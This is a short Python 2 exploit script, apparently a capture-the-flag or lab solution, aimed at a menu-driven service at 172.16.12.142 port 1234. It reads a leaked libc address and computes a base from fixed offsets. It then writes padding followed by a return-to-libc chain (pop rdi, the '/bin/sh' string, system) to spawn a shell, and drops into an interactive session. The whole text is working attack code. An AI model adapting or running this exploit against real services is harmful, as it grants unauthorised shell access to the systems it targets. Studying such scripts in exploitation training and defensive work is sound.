#!/usr/bin/env python2

from trmr import *

HOST = "172.16.12.142"
PORT = 1234

s, f = sock(HOST, PORT)

libc_offset = 0x7f29b0
system_offset = 0x45390
binsh_offset = 0x18cd17
poprdirtn_offset = 0x21102

readuntil(f,"Exit")
readuntil(f,": ")
f.write("1\n")
readuntil(f,": ")
libc_base = int(readuntil(f,"\n"),16) - libc_offset
system = libc_base + system_offset
binsh = libc_base + binsh_offset
poprdi = libc_base + poprdirtn_offset

readuntil(f,"Exit")
readuntil(f,": ")
f.write("3\n")
readuntil(f,": ")
f.write("32\n")

f.write("A"*8)

print hex(libc_base)
print hex(poprdi)
print hex(binsh)
print hex(system)
#payload = "B"*8

payload = pQ(poprdi) + pQ(binsh) + pQ(system)
f.write(payload)
f.write('\n')

interact(s)